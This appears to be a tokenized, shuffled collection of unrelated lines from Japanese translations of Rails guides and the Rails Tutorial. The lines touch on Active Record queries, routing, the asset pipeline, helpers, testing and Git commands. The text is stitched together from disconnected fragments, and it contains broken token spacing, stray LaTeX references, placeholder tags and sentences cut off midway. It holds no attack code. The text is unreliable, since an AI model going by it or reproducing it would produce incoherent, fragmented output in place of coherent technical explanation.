▁これは ▁( a ) ▁ 私 が よ ほど 無 能 である か 、( b ) ▁Rails の 内部 を知り つ く さ なくても 熟 練 した Rails 開発者 に な れる 、 ということ のどちら か でしょう 。
▁` Model ▖ find ` で 実行される SQL に ` L I MIT ` を 適用 したい場合 、 リレーション で ` limit ` メソッドと ` offset ` メソッドを使用することで ` L I MIT ` を指定できます 。
▁ ちなみに 、 通常 このような 小さな 変更 のために わざわざ ブランチ を作成する 必要はありません が 、「 よい 習慣 を 形 成 するには 早 すぎる 」 ということ ないので 、 早い 時 期 から 少し でも 練 習 しておきましょう 。
▁ 実際の アプリケーション コードをリスト \ ref { code : user _ create _ action } に示します ▁(\ k ode { redirect \_ to } ▁ メソッド に注目し てください ) 。
▁| ▁| ▁42 4 ▁| ▁: failed _ dependency ▁|
▁図 \ ref { fig : initial _ failed _ login _ rails _3} に表示されている デバッグ情報 にご注目ください ▟\ ref { sec : login _ form } の 終わり でも 簡単に触れ ましたが 、\ k ode { params } ハッシュ では 、 以下のように \ k ode { session } キー の下に メールアドレス と パスワード があります 。
▁上の 原 則 に従って 、 リスト \ ref { code : persistent _ sessions _ test } のコードは 以下のように 書かれてい ます 。
▁この パターン は 、 user ▁ オブジェクトの 関連付けを \ emph { 経 由 して } マイクロポスト を作成する 標準的な 方法 です 。
▁rake (" db : migrate ")
▁ これが 起こ る のは 、 c と o ▖ customer は 同じ データ が メモリ 上で 異なる 表現 と な っ ており 、 一 方 が更新され ても 他 方が 自動的に は 更新 されない ためです 。
▁Date ▖ new (201 0, ▁ 12 , ▁ 23 )▖ change ( year : ▁2011 , ▁ month : ▁ 11 )
▁ 初期化 処理 が ここ まで 進 む と 、 railties や エンジン イニシャライザ はすべて 起動 しています 。
▁この User モデルの 例 の場合 、 マイグレーション は モデル 生成 スクリプト によって自動的に 作 ら れ ました ▟ リスト { p 0} に示したように {2} name {/2} と {2} email {/2} の 2 つの カラム を持つ {2} users {/2} テーブル を作成します
▁さらに 、\ k ode { ul } タグ に 付 与 されている \ k ode { nav } や \ k ode { navbar - nav }、\ k ode { navbar - right } クラス も Bootstrap において 特別な 意味 を持ちます ▟ したがって 、\ ref { sec : custom _ css } で Bootstrap の CSS を追加した ときに 、 これらの スタイル も 自動的に 適用 されます 。
▁デフォルトでは 、 ヘルパー ファイル で 定義されている メソッドは 自動的に すべての ビューで 利用できます ▟ ここでは 、 利 便 性 を 考え て \ k ode { gravatar \_ for } を Users コントローラに 関連付けられている ヘルパー ファイルに 置く ことにしましょう 。
▁ ルート URL ▁( Home ページ ) ▁ に GET リクエストを 送 る
▁after _ bundle ▁do
▁なお 、` ActiveRecord ` は Ruby モジュール 名 だ が 、 Active ▁Record は ORM を指す 。
▁ { a : ▁1 } ▖ assert _ valid _ keys (: a ) ▁# ▁ パス する
▁このガイドでは 、 Active ▁Record を使用して データベースから データを 取り出す ための さまざまな 方法 について解説します 。
▁### ▁ リモート ▁`< script >` ▁ タグ に CSRF 保 護 を 実 施
▁> > ▁1▖ year ▖ from _ now
▁(\ k ode { user } を \ k ode { self } に切り替え る という 手 も ある のですが 、\ k ode { self } は モデル 内で は 必 須 ではない と \ ref { sec : uniqueness _ validation } で 解説 した ことを思い出しましょう ) 。
▁さらに 、\ k ode { home ▖ html ▖ erb } ファイル が変更され ると ▁\ k ode { static _ pages _ spec ▖ rb } が自動的に 実行される ように Guard を設定する こともできます 。
▁# ▁=> ▁{" " ▁=> ▁nil , ▁" a " ▁=> ▁: a , ▁ "1" ▁=> ▁1 }
▁config ▖ assets ▖ css _ compressor ▁= ▁: yui
▁not h ing ▁to ▁commit ▁( working ▁directory ▁clean )
▁なお 、 String クラスの 内部で は 、 メソッド や 属性 を呼び出す ときの \ k ode { self ▖ } も 省略 可能です 。
▁ 単語 \ emph { は } 文字列 なので 、 リスト \ ref { code : word _ class } のように \ k ode { Word } クラスは ▁\ k ode { String } クラスを \ emph { 継 承 } する のが 自 然 です
▁リスト \ ref { code : account _ activation _ view _ text } や リスト \ ref { code : account _ activation _ view _ html } で定義した テンプレート の 実際の 表示 を簡単に 確 認 するために 、\ emph { メール プレビュー } という 裏 技 を使って みましょう ▟ Rails では 、 特殊な URL にアクセスすると メールの メッセージ を その 場 で プレビュー することができます ▟ メールを 実際に 送信 し なくても よい ので 大 変 便利です 。
▁この 点 については この後 で カ バー します ) 。
▁以下の Active ▁Record の例では 、` Module # qualified _ const _ set ` で このメソッド を使用しています 。
▁( データベースの マイグレーション の詳細については \ ref { sec : database _ migrations } 以降 で説明します ) 。
▁このセクションでは 、 ジョブ の作成 方法 と ジョブ の 登録 ▁( enqueue ) ▁ 方法を 手順を 追 って 説明します 。
▁最初に ブラウザから の リクエスト を見てみましょう ▟ この リクエスト は 、 アドレス バー に URL を 入力 したり リンクを クリック した 時に 発生 します ▁({0}{1} 図 2▖1 1 {/1}{/0} の 1 ) 。
▁\ k ode { header } タグ の内側に は 2 つの \ k ode { div } タグ があります 。
▁id : ▁[1, 2, 3 ])
▁つまり 、 ローカライズ 版 ビュー が なくても 動作します が 、 ローカライズ 版 ビュー があれば それ が使用されます 。
▁ 参 考 まで に 、 リスト \ ref { code : sendgrid _ config } で使用する Heroku の 環境変数 を表示する には 、 以下のコマンドを実行し ます 。
▁この 状態 で フォームを送信すると 、 既に お 馴染 み の 以下の エラーが表示され ます 。
▁ 両者 の サービス は非常に 似 通 っています ▟ どちらも 、 Git リポジトリ の ホスティング と 共 同 作業 を行う ことができ 、 リポジトリ の表示 や 検索 を 行い や す く してくれます 。
▁### ▁` belongs _ to ` 関連付け の詳細
▁number _ to _ phone ( 1235551234 ) ▁# ▁=> ▁ 123 - 555-1234
▁{0} 図 8 ▖ 6 {/0} ▁{1} フラッシュメッセージ が 消え ずに 残 っている 例 {/1}
▁| ▁key ▁| ▁key _ le n ▁| ▁ ref ▁| ▁rows ▁| ▁ Extra ▁|
▁| ▁| ▁5 10 ▁| ▁: not _ ext end ed ▁|
▁`: counter _ cache ` オプションは 、 従 属 している オブジェクトの 数 の 検索 効率 を 向上 させ ます 。
▁ 曖昧 さ の ない 「 フォローしているユーザー ▁( followed ▁users )」 と 、 Twitter 式 の 「 フォローしている ▁( following )」 表示 を 両方 採 用 しました が 、 この ルーティング では 仕 組み 上 残念ながら 曖昧 な 方 の ▁" following " ▁ を使用 せ ざ る を 得 ません 。
▁" "▖ duplicable ?
▁Spork は 環境 を \ emph { 1 回 だけ } 読み込み 、 今後 実行する テスト のための プロセス を 管理 します 。
▁ 対象 ブランチ に切り替え て 変更を 適用 します 。
▁# ▁config ▖ assets ▖ precompile ▁ += ▁% w ( ▁search ▖ js ▁ )
▁ 生成された HTML フォーム を リスト \ ref { code : login _ form _ html } に示します 。
▁format ▖ js が ` respond _ to ` ブロック の中に ある 点にご注目ください ▟ これによって 、 ▁ コントローラ が Ajax リクエスト に 応答 できるようになります 。
▁ 出力 を見 やすくするため に フラグ をオーバーライドする こともできます ▁( ただし オプション の 意味 を 十分 理解 した うえで ですが ) 。
▁### ▁ フィードバック を 受け取る
▁ 具体的な 方法 については この章 の最後 で説明します 。
▁さらに 、 ジョブ 管理 フレームワーク を 切り 替 え る 際に ジョブ を 書き 直 さ ずに 済み ます 。
▁このオプション が true になっている と 、 アプリケーションの アセット が ` config ▖ assets ▖ precompile ` に記載されている とおり に すべて 読み 込 まれ ている かどうかをチェックします 。
▁上のルーティングは ブラウザから の ` / photos / 12 ` パス にマッチし 、` Photos ` コントローラの ` show ` アクション に割り当てられ ます 。
▁number _ with _ precision ( 111▖2345 ) ▁# ▁=> ▁111▖23 5
▁# ▁ Cache - Control を使用する テストで 静 的 アセット サーバー を 構成 し 、 パフォーマンス を 向上 させる
▁* ▁` joins `
▁$ ▁rails ▁console
▁最後に 、 あらゆる マイクロポスト は ユーザーの id を持っている べ き なので 、\ k ode { user \_ id } の 存在性 のバリデーション に対するテスト も 追加します 。
▁ 最 近 の Rails に 追加 された 機能 の中で 最も 特 筆 すべき 機能 のひとつ は 、 CSS 、 JavaScript 、 画像 などの 静 的 コンテンツ の 生 産 性 と 管理 を 大 幅 に 強 化 する 「 Asset ▁Pipeline 」 です 。
▁この 代入 演算子 は 、\ k ode {@ current _ user } が 未 定義 の 場合にのみ 、\ k ode {@ current _ user } インスタンス変数 に 記憶トークン を設定します
▁has _ many ▁: line _ items
▁ユーザー登録 に 成功 すると 、 データベース 上に ユーザーが 追加 、 プロフィール ページに リダイレクト 、 ウ ェ ル カ ム メッセージ の表示 といった 順 で 処理 が 進 む
▁\ href { http :// en ▖ gravatar ▖ com / site / implement / hash /}{ Gravatar の ホームページ } にも 書かれてい るように 、 Gravatar の URL は \ href { http :// en ▖ w ikipedia ▖ org / wiki / M D 5 } { M D 5 ハッシュ } を 用 いて ユーザーの メールアドレスを ハッシュ化 しています 。
▁ただし 、 上のような 命 名 は単なる 慣習 に過ぎません ▟ 実際 、 コマンドライン 上で 以下のような ス ネ ー ク ケース の コントローラ 名を 入力 しても 、
▁# ▖▖▖
▁d ▖ advance ( months : ▁1, ▁second s : ▁1)
▁A ▁ generalized ▁\ k ode { authenticated ?}
▁=> ▁#< Blorgh :: Article ▁id : ▁1 ▁▖▖▖
▁このとき accept パラメータ では 、 リスト { p 0} で 許可 した ファイル 形式 を 、 {2} MIME タイプ {/2} で 指定 する ようにします 。
▁@ user ▁= ▁user
▁図 \ ref { fig : valid _ submission _ error } が 示す ように 、 Rails のデフォルトの アクションは 対応する ビュー を表示する ようになっています ▟ しかし \ k ode { create } アクション に対応する ビューの テンプレート がない ため ▁( ある は ず が ありません ) 、 このような エラーが発生し ています 。
▁最後に 、 Rails ▁ には 、 非常に 熱 心 で 多 様 な コ ミ ュ ニ テ ィ があります 。
▁ パ イ プ ラ イン の アセット は 、 アプリケーション 内の ` app / assets `、` lib / assets `、` vendor / assets ` の 3 つの ディレクトリ のいずれか に 置く ことができます 。
▁self を省略した 結果を リスト \ ref { code : test _ domain _ host } に示します 。
▁詳細については ` Date ▖ _ parse ` の ドキュメント を参照してください 。
▁まずは 、 ユーザー 間 の関係 性 を どう モデリング するか について 学びます ▁(\ ref { sec : the _ relationship _ model })▟ その後 、 ▁A モデリング 結果 に対応する Web イン ター フ ェ ー ス を実装 していきます ▁(\ ref { sec : a _ web _ interface _ for _ following _ and _ followers })▟ このとき 、 Web イン ター フ ェ ー ス の 例として Ajax についても 紹介します 。
▁これ をチェックする には 否 定 演算子 ▁(\ ref { sec : objects _ and _ message _ passing }) が必要 なので 、\ k ode { !} ▁( 参 考 : ▁ 英語 では bang と 読み ます ) ▁ を使用します 。
▁=> ▁" foobar "
▁たとえば 、 `@ re view ▖ title ` を 何 の 工 夫 も なく そのまま HTML に 式 展開 する ような ことは 絶対に すべき ではありません 。
▁つまり 、` Date ▖ today ` が ` Date ▖ yesterday ` と 等 しく な ること があり え る ということです 。
▁この節では 、 ユーザーに ログインを要求 し 、 かつ 自分 以外の ユーザー情報 を変更 でき ないようにする セキュリティ モデルを 構 築 しましょう 。
▁@ user ▁= ▁User ▖ find ( params [: id ])
▁create _ table ▁: account _ h ist or ies ▁do ▁| t |
▁master
▁ ここ が重要です ▟ アプリケーションは ▁** い か なる 場合 も ** ▁ エンジン よりも 優 先 されます 。
▁ フィード ア イ テ ム パーシャル に 削除リンク を追加する 。
▁この 演習 は 不 必要 に 複 雑 で 、 もし 各 テストの 直前に 共通の セットアップ 用 タスク があれば 、 た しか に 不要な 負 荷 が か か る ことでしょう 。
▁デフォルトでは 、` config ▖ logger ` と同じ 設定 が使用されます 。
▁WARNING : ▁ 画像ファイル の 拡張子 は 省略 できません 。
▁# ▁< hash >
▁ 皆さん が 拡張 を 始 め る に あたり 、 さ さ や か ながら 私 から 2 つ ほど 一般的な ア ド バ イ ス を してみ たい と思います 。
▁ この動作 の詳細 を 気にする必要はありません ▁( 悪 い ことを している わけで も ありません )▟ こ の詳細 に 関 心 を 抱 く のは Rails フレームワーク そのもの の 開発者 ぐらい であり 、 Rails で アプリケーションを開発する 人 にとって は 重要 ではありません 。
▁これは ユーザー に対して \ k ode { admin ?} メソッド ▁( 論理値 を返す ) ▁ が 使用できる 必要がある ことを ▁( RSpec の 論理値 慣習 に基いて ) ▁ 示 しています 。
▁この 強力な 技 法 が 、 Ajax と呼ばれ ている ものです 。
▁` truncate ` メソッドは 、 指定された ` length ` に まで 長さ を 切り 詰 め た レシーバの コピー を返します 。
▁次に 、\ k ode { id } = \ k ode {3} の ユーザーが まだ データベースに 存在する かどうかを確認 してみましょう 。
▁\ k ode { user ▖ save } を実行し た ことで ユーザーが 更新 で きました ▟\ ref { sec : creating _ user _ objects } で 約 束 した ように 、 マジックカラム の 更新 日時 も 更新 されています 。
▁この ディレクティブ は 、` require _ self ` 呼び出し が 行われた その 場所に CSS ファイル があれば 読み込み ます 。
▁ 外部キー が 自分の クラス ではなく 相手 の クラス にある のであれば 、` belongs _ to ` ではなく ` has _ one ` を使用する必要があります 。
▁このとき コールバック は 実行 されません 。
▁ 配列 は 、 上 記 コード の最初の 行 の \ k ode { length } メソッド 以外に も 、 さまざまな メソッドに 応答 します 。
▁def ▁set _ author
▁has _ many ▁: articles
▁3 ▖ ▖ 9 ) ▁# ▁=> ▁false
▁第 \ ref { cha : account _ activation _ and _ password _ reset } 章では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁\ k ode { gem } コマンドで 特定の バージョン番号 を 指定 し ない限り 、 Bundler は自動的に 最新 バージョンの gem を取得し て インストール します 。
▁Rails 開発 経験 者 にとって は 、 {0}{1} リスト 4 ▖ 2 {/1}{/0} のコードは スタイルシート を インクルード する の と 大 差 ない 単純な ものです が 、 ここに も Ruby の 重要な 概念 が \ emph { 多数 } 含まれています ▟ モジュール 、 メソッド 定義 、 任意の メソッド 引数 、 コメント 、 ローカル変数 の 割り当て 、 論理値 ▁( boolean ) 、 制御 フ ロー 、 文字列 の 結合 、 そして 戻り値 です 。
▁NOTE : ▁ ここ に記述 するのは ▁" ホスト 名 " ▁( サブドメイン と ルート ドメイン を 合わせ た もの ) ▁ のみ です ▟ ` http :// ` や ` https :// ` などの プロトコル ス キー ム を 記 述 する必要はありません 。
▁上のコードは ひ と まず 動作します が 、 実は まだ 「 Ruby 的に 」 正しい コード ではありません ▟\ k ode {@ current \_ user } への 代入 は 、 Ruby では 以下のような 短縮 形で 書く のが 王 道 です 。
▁\ k ode { empty ?} メソッドの 末尾に ある 疑問符 にご注目ください 。
▁\ k ode { db : seed } で Rake タスク を実行し 終 わ ると 、 サンプルアプリケーションの ユーザーが 1 00 人 になっています 。
▁\ ref { sec : signup _ error _ messages } では 、 ユーザー登録 の エラーメッセージ 表示 に User モデルの エラーメッセージ を うまく 利用 した ことを思い出しましょう 。
▁HTML テンプレート に データを 挿入する 方法は 、 きわめて 慎 重 に 設計 する必要があります 。
▁if ▁boolean ?
▁# ▁ 実行 後に 行なう 作業
▁#### ▁check _ box _ tag
▁Heroku への デプロイ が完了し たら 、 自分 が 管理 している メールアドレス を使用して 、 production 環境 の サンプルアプリケーション で ユーザー登録 を行って みましょう 。
▁ 作成する ドキュメント 自身 が Rails の ベ スト プ ラ ク テ ィ ス の よい モデル となる ように 、 そして Rails の 最新 かつ 模 範 的な 使用 法 になるように 書くこと 。
▁さらに 、` - - mountable ` オプションは ダ ミ ー のテスト 用 アプリケーションを ▁` test / dummy ` に 配置 するよう ジェネレータ に 指示 します ▟ これは 、 以下の ダ ミ ー アプリケーションの ルーティング ファイルを ` test / dummy / config / routes ▖ rb ` に追加する ことによって 行います 。
▁デフォルトは 以下の とおり です 。
▁ 結合 モデル ( join ▁model ) の コレクション は 、 API 経由で 管理 できます ▟ たとえば 、 以下のような 割り当て を実行し た とします 。
▁従って 、 新しい セッション フォーム を作成するとき には 、\ k ode { form \_ for } ヘルパー に 追加 の 情報を 独自 に 渡 さ なければなりません 。
▁ 簡単に 言 う と 、 まず 以下の コマンドで データベースの マイグレーション を変更 できます 。
▁Web 経由で マイクロポスト を作成する 方法は 現時点では ありません が ▁(\ ref { sec : creating _ microposts } から 作り 始 め ます ) 、 マイクロポスト を表示する こと と 、 テスト すること なら できます 。
▁SQL は 大文字 小文字 を 区別 しません が 、 慣習 的に SQL の キーワード ▁( ▁\ k ode { D E S C } など ) ▁ は 大文字 で 書くこと になっています 。
▁デフォルトは `: ruby ` で 、 データベースに は 依 存 せず 、 マイグレーション に依存し ます ▟ `: sql ` を指定すると SQL 文 で 書き 出 されます が 、 この場合 潜 在 的に データベース に依存する 可能性があります 。
▁` config / initializers / inflections ▖ rb ` にある ビルトイン の ルール は 拡張 可能です 。
▁name : ▁" David ")
▁以下は 、 Active ▁Record によって 提供され る さまざまな データ アクセス メソッドの ほんの 一 例 です 。
▁ advance
▁self を省略した 結果を リスト \ ref { code : micropost _ create _ image _ upload } に示します 。
▁self を省略した 結果を リスト \ ref { code : users _ controller _ test _ login _ route } に示します 。
▁Rails コンソール でも 、 リスト \ ref { code : static _ pages _ controller } の ▁\ k ode { home } ▁ アクション や 、 リスト \ ref { code : title _ helper } の \ k ode { full \_ title } ヘルパー と同じ 方法で メソッド を定義する ことができます
▁Sass と Asset ▁Pipeline は 、( 開発 効率 のために 切り 分 け られた ) ▁CSS の 冗 長 な 部分を 圧縮 し 、 本番環境 に 最適化 した結果 を出力する
▁Rails のデフォルトの ` has _ and _ belongs _ to _ many ` 関連付け は 、 ほとんどの場合 カスタマイズ 不要 ですが 、 時に は 関連付けの 動作を カスタマイズしたくなること も ある と思います 。
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の各 操作を 発 展 させた \ emph { REST ▁ アーキテクチャ } の 影 響 を受け ています ▟ 第 \ ref { cha : a _ toy _ app } 章 でも 簡単に触れ ましたが 、 第 \ ref { cha : sign _ up } 章では 、 より 深 い 内容 について 学びます 。
▁$ ▁git ▁ checkout ▁- b ▁testing _ branch
▁get ▁' / patients / : id ', ▁to : ▁' patients # show '
▁ わかりやすく するために 、 この タグ によって 生成される HTML を以下に示します
▁ はじめ て の Ajax
▁たとえば 、` ActionView :: Helpers :: Form Helper ` では 以下のように 定義 されています 。
▁client ▁= ▁Client ▖ last
▁{0} 図 5 ▖8{/0}{1} \ href { http :// localhost :3000/ about }{/ about } で表示される About ページ ▟\ href { http :// railstutorial ▖ org / images / figures / about _ page _ style d - full ▖ png }{( 拡大 ) }{/1}
▁ この動作 は ` Module ▖ attr _ internal _ na m ing _ format ` を使用して 変更 することもできます ▟ ` s print f ` と同様 の フォーマット 文字列 を与え 、 冒 頭 に `@ ` を 置 き 、 それ以外の 名前 を 置 き たい 場所に ` % s ` を 置きます 。
▁ただし 、 これ を実行して も Active ▁Support 全体 が メモリ に 読み込まれる わけで は ない ことにご注意ください ▟ 一 部 は ` autoload ` として 設定 されており 、 実際に 使う まで 読み 込 まれ ません 。
▁( 振る舞い を検証する 統合テスト は \ ref { sec : following _ tests } で 実装します ▟)
▁ 生成された フォームの HTML を見 たい場合は 、 ブラウザ 上で 表示 画面 を 右 クリック し 、 出 てきた ポ ッ プ アップ 項目 の中から ▁[ ソース を 表示 ] ▁ といった 項目 をクリックして ください ▟ Web ページの HTML ソース は リスト \ ref { code : signup _ form _ html } のようになります 。
▁この節では 、 以後 この フ ロー の 実現 に 専 念 します 。
▁<%= ▁form _ for ( [ @ article , ▁@ article ▖ comments ▖ build ]) ▁do ▁| f | ▁%>
▁example _ user で使用する コード
▁` blog ` ディレクトリ の下に は 多数の ファイル や フォルダ が生成され ており 、 これら が Rails アプリケーションを 構成 しています 。
▁ 普通 は 、 実際の アプリケーション 開発 時に 上のような 操作 を行う ことはありません ▟ ここでは 、 レイアウトファイル の 役 割 を より わかりやすく 説明 するために 、 最初に レイアウトファイル を 無効 に しています 。
▁ ポ リ モ ー フ ィ ッ ク な ` belongs _ to ` は 、 他の あらゆる モデル から 使用できる 、( デザイン パターン で言う ところ の ) インターフェイス を設定する 宣言 とみなす こともできます 。
▁\ k ode { default \_ scope } を使うと デフォルトの 順序 を変更 できる
▁ 本番環境で 動作する ステータスフィード
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ アセットを ローカル で プリコンパイル する 理由は いくつか 考え られます 。
▁* = ▁require ▁ ch r o me
▁この 行 の 意味 については 、\ ref { sec : user _ micropost _ associations } で説明します 。
▁ Cache - Control : ▁public , ▁ max - age = 25 92 000
▁d ▁- ▁3 ▖ hour s
▁` clear ` メソッドは 、` errors ` コレクション に含まれる メッセージ をすべて ク リ ア したい場合 に 使用できます 。
▁ 表 { p 0} で示した {2} edit _ user _ path {/2} という 名前付きルート と 、 ▁リスト \ ref { code : current _ user _ working } で定義した {2} current _ user {/2} という ヘルパーメソッド を使うと 、 実装 が 簡単です 。
▁TIP : ▁ 表 面 的な もの に と ど ま る 変更 や 、 Rails の 安 定 性 / 機能 性 / テストの し や す さ の 根 本 的な 部分を 何も 改良 しないよう な 変更 は 受け付け ら れ ません ▟ 詳細については ▁[ our ▁ r ation al es ▁ behind ▁this ▁ de ci s ion ]( https :// github ▖ com / rails / rails / pull /1 37 7 1 # issue comment - 3 27 4 67 00 ) ▁( 英語 ) ▁ を参照してください 。
▁config ▖ assets ▖ css _ compressor ▁= ▁ Trans form er ▖ new
▁( { p 0} で {2} co {/2} エイリアス を設定し た場合 は 、 {2} git ▁co ▁- b ▁modify - README {/2} と 入力 することもできます ) 。
▁\ k ode { following } メソッドで 配列 のように 扱 え る だけで も 便利です が 、 Rails は 単純な 配列 ではなく 、 もっと 賢 く この 集合 を 扱 っています 。
▁ 指定された 属性 で エラーが発生し なかった場合 は 、 空の 配列 が返されます 。
▁* ▁` set _ clear _ dependencies _ hook `: ▁` active _ record ▖ set _ dispatch _ hook s ` への フック を提供します ▟ この イニシャライザ より 前に 実行されます 。
▁ さ し あ た って 、 コメント テキスト を出力する 役 目 を この パーシャル に 担 って も ら わ なければなりません 。
▁te }╼╼ ▁% ▁subsection ▁a _ working _ log _ in _ method ▁( end )╼╼ ╼\ subsection { 現在のユーザー } ▁% ▁( fold )╼\ label { sec : current _ user }╼╼
▁<%= ▁image _ tag ▁ attachments [' image ▖ jpg '] ▖ url , ▁ alt : ▁' M y ▁P h o to ', ▁class : ▁' photos ' ▁%>
▁self を省略した 結果を リスト \ ref { code : proto _ status _ feed } に示します 。
▁concern を利用する と 、 同じ ような ルーティング を 繰り返し 記 述 せずに 済み 、 複数の ルーティング 間 で 同じ 動作を 共有 できます 。
▁デフォルトは true です 。
▁$ ▁git ▁pull ▁-- re base
▁* ▁ private や protected の 後 の 行 は インデント する 。
▁続いて 、 リスト { p 0} の内容を {2} README ▖ md {/2} に 入力 します 。
▁# ▁try メソッド を使用し ない場合
▁ 代りに データ 属性 を使用してください ▁( 例 : ▁` data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? ' ▁}` ) 。
▁本ガイドでは 、 最初に この エンジン を 単 体 で 動作する ように し 、 後に この エンジン を アプリケーションに フック します 。
▁ここで \ href { http :// localhost :3000/ users / new }{\ text tt { new } } ページに 戻 り 、 ユーザーを もう 1 人 作成 してみましょう ▟\ href { http :// localhost :3000/ users }{\ text tt { index } } ページ を表示し てみると 、\ ref { fig : demo _ user _ index _ two _ rails _3} のように ユーザーが 追加 されています 。
▁# ▁Ruby ▁on ▁Rails ▁ チュートリアル : サンプルアプリケーション
▁d ▖ next _ week (: s at ur day ) ▁# ▁=> ▁S at , ▁ 15 ▁May ▁2010
▁ アプリケーションコード は 、\ ref { sec : getting _ started _ with _ testing } の About ページ への 追加 と 良 く 似 ています ▟ 最初に ルート ▁( リスト \ ref { code : contact _ route }) ▁ を更新し ます ▟ 次に \ k ode { contact } アクションを StaticPages コントローラ ▁( リスト \ ref { code : contact _ action }) ▁ に追加します ▟ 最後に Contact ビュー ▁( リスト \ ref { code : contact _ view }) ▁ を作成します 。
▁ 新しい コントローラの 作成 は {0} 第 {1} 2 {/1} 章 {/0} で 行います 。
▁`: id ` は 、 ここに `: id ` パラメータ が 置かれ ること を指定する ための 特殊な 文法 です ▟ この場合は 記事 の id を表し ます 。
▁このとき 、 可能な 限り \ k ode { self } ▁( user 自身 を表す オブジェクト ) ▁ を省略 し ている点に注目してください 。
▁#### ▁ その他の 時間 計算
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / deep _ merge ▖ rb ` です 。
▁Rails アプリケーションでは 、\ text tt { POST } リクエスト は 何か を \ emph { 作成する } ときに よく使われます ▁( なお 本 来 の HTTP では 、\ text tt { POST } を 更新 に 使って も よい と しています ) 。
▁P ref i x ▁Verb ▁ URI ▁ Pattern ▁Controller # Action
▁WARNING : ▁` reverse _ merge !` は 呼び出し 元の ハッシュ を変更する 可能性 がある ことにご注意ください ▟ それが 意図 した 副 作 用 である か そうでない か にかかわらず 、 注意が必要です 。
▁- ▁[ NGINX ]( http :// wiki ▖ n g in x ▖ org / X Sendfile )
▁これらの バリデーション は 、` valid ?` を呼び出す たびに 実行されます 。
▁resources ▁: magazine s ▁do
▁ 「 Ctrl - C 」 と同様に 「 Ctrl - D 」 と 表 記 する 慣習 になっています が 、 ▁ 実際に 押 す のは 小文字 の d なので 、 シ フ ト キーを 押 し 続ける 必要はありません 。
▁これで 、 すべての テストが {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} するはずです 。
▁order _ number : ▁" A 12345 ")
▁このヘルパーは データベース 自体 に 一意性 の 制 約 を作成する わけで は ないので 、2 つの データベース接続 が た また ま 、 一意 で あって ほ しい カラム について 同じ 値 を持つ レコードを 2 つ 作成する ような ことが 起こ り 得 ます 。
▁ データベース の観点 では 、 この 関連付け において は 相手 の クラス が 外部キー を持ちます ▟ この 外部キー は 相手 の クラス のインスタンス を参照 します 。
▁たとえば この節 では 、 ユーザーが データベースに保存 される 前に name と email フィールド の両方 が存在する ことを 保 証 します 。
▁これは 、 指定された アセット へのパス を記述し ます 。
▁2 つ目の ケース では 、 ルーティング で 正しく 処理 される ように \ k ode { user } という ハッシュ も 渡 しています 。
▁# ▁set ▁to ▁< tt > : create </ tt > ▁if ▁< tt > new _ record ?
▁Rails は \ k ode {@ users } を \ k ode { User } オブジェクトの リスト である と 推 測 します ▟ さらに 、 ユーザーの コレクション を与え て 呼び出す と 、 Rails は自動的に ユーザーの コレクション を列挙し 、 それぞれの ユーザーを \ k ode { _ user ▖ html ▖ erb } パーシャル で 出力 します ▁( 訳 注 : ▁each ▁do と end で 囲 む 必要 が なくなります ) 。
▁ 最終的に は 次のような HTML は になります 。
▁この サンプルアプリケーション には 、 Rails の 主要な 機能 ▁( モデル 、 ビュー 、 コントローラ 、 テンプレート 、 パーシャル 、 フィルタ 、 検証 、 コールバック 、\ k ode { has \_ many } / \ k ode { belongs \_ to } / \ k ode { has \_ many ▁through } 関連付け 、 セキュリティ 、 テスティング 、 展開 ) ▁ が 多数 含まれています 。
▁リスト \ ref { code : real _ account _ activation _ test } の テストコード では 、 フィクスチャ ユーザーに 有効化トークン を追加 している 点にご注目ください ▟ 追加 しない 場合は 空白 になります 。
▁ フィード の HTML をテストする ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁ 最初は 編集 失敗 時の 簡単な テスト を追加します ▁( リスト \ ref { code : unsuccessful _ edit _ test }) 。
▁ 今 の状態 では 、 新しく アカウント を 登録 した ユーザーは アカウント に対する フル アクセス 権限 を 持 っています ▁( {0} 第 {1} 7 {/1} 章 {/0} ) ▁ が 、 このままでは い か にも 大 雑 把 です 。
▁# ▁=> ▁< field set >< p >< input ▁id =" name " ▁name =" name " ▁type =" text " ▁ / ></ p ></ field set >
▁ 大きく 3 つ に 分 か れ ます : ▁ 高度な パス / 失敗 表示 ▁(\ ref { sec : minitest _ reporters }) 、 テスト 失敗 時の 大量の バ ッ ク ト レ ー ス メッセージ を フィルタ する ユーティリティ ▁(\ ref { sec : backtrace _ silencer }) 、 ファイルの 変更を 検出 して 、 必要な テスト だけ を 自動 実行 してくれる 「 自動 テスト 実行 ユーティリティ 」( \ ref { sec : guard }) 。
▁create ▁app / assets / stylesheets / static _ pages ▖ css ▖ scss
▁--------- ---------------
▁ 単純な 修正 を バックポート する 最も 簡単な 方法は 、[ master と 自分の 変更 の d if f を と って 対象 ブランチ に 適用 する ]( http :// a ri e ja n ▖ net / 200 9 / 10 / 2 6 / how - to - create - and - app ly - a - patch - with - git ) ことです 。
▁\ emph { Rails ▁ チュートリアル } は 、 統合 的な チュートリアル になっています ▟ 本チュートリアル は ▁Rails ▁ を 中 心 に 構成 されています が 、 他にも 、 Ruby ▁ 言語 や ▁RSpec ▁ を使った テスト 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTML } { HTML }、\ href { http :// en ▖ w ikipedia ▖ org / wiki / CSS } { CSS } 、 そして 、 わずか な ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / JavaScript } { JavaScript } ▁ と ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL } { SQL } ▁ の チュートリアル も 含まれています ▟ このような 統合 的な チュートリアル になっている ため 、 現時点の ▁Web ▁ 開発 の 知識 量 に 関 わ らず 、 この チュートリアル を 読み 終 え る 頃 には 、 あなた は 上 述 した 各 トピック を 卒 なく こ な せる ように なる だけ ではなく 、 より 高度な 情報 源 を 難 なく 読み こ な す 実 力 が つ く ようになります 。
▁URL ▁ / users /1 ▁ のルーティング は 有効 だ が ページ がない 状態
▁ すべての ユーザーが フィード を持つ ので 、\ k ode { feed } メソッドは User モデル で 作る のが 自 然 です ▟ フィード の 原 型 では 、 まずは 現在 ログイン している ユーザーのマイクロポスト をすべて 取得 して きます 。
